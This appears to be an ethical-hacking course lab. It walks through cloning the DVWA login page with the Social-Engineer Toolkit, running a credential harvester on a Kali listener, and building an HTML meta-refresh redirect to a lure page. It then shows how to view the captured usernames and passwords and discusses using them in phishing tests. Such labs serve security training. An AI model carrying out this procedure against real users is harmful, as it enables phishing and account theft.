# Background

In this activity, you will clone a website and obtain user credentials.
This activity is performed under carefully controlled conditions within
a virtual environment. SET tools should only be used for penetration
testing in situations where you have written permission to perform
social engineering exploits.

# Required Resources

- Customized Kali Linux Vm for Ethical Hacker course
- Internet access

Social-Engineer Toolkit (SET)

The ********Social-Engineer Toolkit (SET)******** is a tool developed by
David Kennedy. This tool can be used to launch numerous social
engineering attacks and can be integrated with third-party tools and
frameworks such as Metasploit. SET is installed by default in Kali Linux
and Parrot Security. However, you can install it on other flavors of
Linux as well as on macOS. You can download SET
from [**https://github.com/trustedsec/social-engineer-toolkit**](https://github.com/trustedsec/social-engineer-toolkit).

### 1. Load the SET application {#load-the-set-application}

SET must be run as root. Use the **sudo -i or sudo su **command to
obtain persistent root access. At the prompt, enter the command
**setoolkit **to load the SET menu system.

The Social Engineering Toolkit can also be run from the **Applications
\>Social Engineering Tools \>social engineering toolkit (root) **choice
on the Kali menu.

┌──(kali㉿Kali)-\[\~\]

└─\$ **sudo -i**

\[sudo\] password for kali:

┌──(root㉿Kali)-\[\~\]

└─# **setoolkit**

OUTPUT:

![](Pictures/100000000000045F00000362C6E7BA6C.png){width="17cm"
height="13.155cm"}

** **If this is the first time that you have run SET, the license terms
and conditions are displayed, and an agreement is required. Read the
terms carefully.

After reading the disclaimer, enter **y **to accept the terms of
service.

### 2: Examine the Available Social-Engineering Attacks. {#examine-the-available-social-engineering-attacks.}

1.  At the SET prompt, enter **1 **and press **Enter **to access the
    Social-Engineering Attacks submenu.

Set\> **1**

**OUTPUT:**

![](Pictures/10000000000004490000034F1484EBA9.png){width="17cm"
height="13.123cm"}

**Note:** In this lab, we will create a perfect copy of the login page
for a website. The fake login page will gather all credentials submitted
to it and then redirect the user to the real website.

## **Cloning a Website to Obtain User Credentials**

## From the Social-Engineering Attacks submenu, choose **2) Website Attack Vectors **to begin the web site cloning exploit. {#from-the-social-engineering-attacks-submenu-choose-2-website-attack-vectors-to-begin-the-web-site-cloning-exploit.}

Set\> **2**

**OUTPUT:**

![](Pictures/100000000000077F0000034AE83D5878.png){width="17cm"
height="8.793cm"}

Select ****3) Credential Harvester Attack Method ****from the menu.

Set\> **3**

OUTPUT:

![](Pictures/100000000000077F0000034AE83D5878.png){width="17cm"
height="7.458cm"}

Select **2) Site Cloner **from the **Credential Harvester Attack
Method** ****menu.

Set\> **2**

****Information describing which IP address is needed to host the fake
website and to receive the POST data is displayed. Enter the web
attacker IP address at the prompt. ****

**OUTPUT:**

![](Pictures/10000000000006C1000003375C7CD4BF.png){width="17cm"
height="8.091cm"}** **

****This is the IP address of the virtual Kali internal interface on the
10.6.6.0/24 network. In an actual exploit, this would be the external
(internet facing) address of the attack computer.****

2.  At the prompt, enter the IP address **10.6.6.1**.

**OUTPUT:**

![](Pictures/10000000000004D8000001D34B13F28B.png){width="17cm"
height="6.401cm"}** **

****Next, enter the URL of the website that you want to clone. This is
the URL of the DVWA website,
****[**http://DVWA.vm**](http://DVWA.vm/)****.****

****set:webattack\> Enter the url to clone:**http://DVWA.vm** ****

****

**OUTPUT:**

![](Pictures/10000000000006D400000176D3CBF234.png){width="17cm"
height="3.635cm"}

****When the website is cloned, the following message appears on the
terminal.****

The best way to use this attack is if username and password form fields
are available. Regardless, this captures all POSTs on a website.

\[\*\] The Social-Engineer Toolkit Credential Harvester Attack

\[\*\] Credential Harvester is running on port 80

\[\*\] Information will be displayed to you as it arrives below:

  
**Note:** No prompt will be returned to you. This is because a listener
is now active on port 80 on the Kali computer and all port 80 traffic
will be redirected to this screen. Do not close the terminal window.****

## **Capturing and Viewing User Credentials**

****

#### ****1: Create the Social Engineering Exploit.**** {#create-the-social-engineering-exploit.}

****

In a "real-life" exploit, at this point, **a phishing exploit containing
a link or QR code that sends the user to the fake website is created and
sent.**

In this lab, an html document is created to direct the user to the fake
webpage.

This document simulates a distributed phishing URL. It could be
distributed as a file attachment in phishing emails.

****Open the Kali Linux text editor using the **Applications \>
Favorites \> Text Editor **choice from the menu. ****

****Enter the HTML code shown into the ****Text Editor ****document.****

****

**\<html\>**

**\<head\>**

**\<meta http-equiv=\"refresh\" content=\"0; url=http://10.6.6.1/\"
/\>**

**\</head\>**

**\</html\>**

****

****Select **File \> Save **from the menu. Name the document
**\<anyname\>.html **and save it in the **/home/kali/Desktop **Folder.
The icon appears on the Kali desktop.****

****Af****ter ****Close the Text Editor application.

****

**OUTPUT:**

![](Pictures/10000000000003580000011697403E20.png){width="17cm"
height="5.519cm"}** **

****The purpose of the cloned website is to present a web page that
looks identical to the one that the user is expecting. A good hacker
would create a fake URL that would be ****very similar to the actual
URL, so that unless the user inspects the URL very closely, it would go
unnoticed.****

****Double-click the ****file you created on the ****desktop the
**\<anyname.html **. The DVWA login page ****will open****

![](Pictures/1000000000000509000003326195A543.png){width="17cm"
height="10.786cm"}**** ****

****

****check the URL to determine the fake and original website.****

****

**ORIGINAL PAGE:**

![](Pictures/100000000000052000000340B66A1647.png){width="17cm"
height="10.781cm"}**** ****

****

****Enter some information in the Username and Password fields and click
**Login **to send the form.****

![](Pictures/10000000000004FC0000032E5FF57F38.png){width="17cm"
height="10.844cm"}****

**** ****

### **View the Captured Information**

### Return to the terminal session that is running the SET application. Output from the login attempt should appear {#return-to-the-terminal-session-that-is-running-the-set-application.-output-from-the-login-attempt-should-appear}

OUTPUT:

![](Pictures/10000000000003D6000000D3D35111AC.png){width="17cm"
height="3.651cm"}**** ****

****To save the report in XML format to use in other penetration testing
applications, enter **CTRL**-**C**. The report file name and path are
returned. Select the path and filename and right-click to copy the
selection. The filenames that are created contain the date and time the
file was created in this format:****

****202****5****-****12****-07 17:32:55.967169.xml****

****

**OUTPUT:**

![](Pictures/1000000000000645000001593CDE3C4A.png){width="17cm"
height="3.653cm"}**** ****

****

****Continue to enter **99** ****and press **enter** ****until you have
exited setoolkit. ****

****To view the content of the XML file, you need to place the filename
in double-quotes (") because it contains spaces and special characters.
****

****Use the ****cat ****command to see the information that is saved.
The file path shown is the default path for the lab VM when this lab was
created. ****

****

****What information did the cloned web page gather?****

****

** We gathered the username and password of the user who attempted to
login to the cloned webpage.**

****What could a penetration tester do with this information?****

****

** Go to the real website and login in as a legitimate user.**

****How could an ethical hacker use this procedure in a test?****

****

** It could be used with a phishing email. For example, the tester could
send emails to various employees asking them to login to a fake URL that
looks like the real one. The URL links to the very familiar login page
that was cloned from the real site. From there, credentials could be
harvested for multiple users. The results of this test could then be
reported to the customer with the mitigation recommendation of
additional user training to prevent similar actual attacks.**
